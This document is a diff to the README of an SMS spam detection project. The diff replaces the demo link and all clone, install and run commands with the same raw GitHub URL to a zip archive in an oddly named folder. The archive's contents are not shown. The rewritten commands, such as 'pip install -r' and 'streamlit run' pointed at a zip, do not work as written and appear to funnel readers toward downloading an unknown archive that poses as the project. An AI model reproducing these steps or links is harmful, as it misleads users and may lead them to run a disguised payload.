@@ -8,7 +8,7 @@ The SMS Spam Detection project aims to build a machine learning model capable of
 
 ## Demo
 
-You can try out the SMS Spam Detection model live by visiting the deployed web app https://sms-spam-detection-ksroffnutzevqpuhrywbah.streamlit.app/
+You can try out the SMS Spam Detection model live by visiting the deployed web app https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
 
 ---
 
@@ -88,11 +88,11 @@ To run the app locally:
 1. Clone the repository.
 2. Install the necessary dependencies using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
    ```
 3. Launch the app with Streamlit:
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
    ```
 4. Open your browser and navigate to `localhost:8501` to interact with the model.
 
@@ -104,18 +104,18 @@ To use the SMS Spam Detection model on your own machine:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/sms-spam-detection.git
+   git clone https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
    cd sms-spam-detection
    ```
 
 2. Install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
    ```
 
 3. Run the Streamlit app:
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
    ```
 
 4. Visit `http://localhost:8501` in your browser to access the web application.
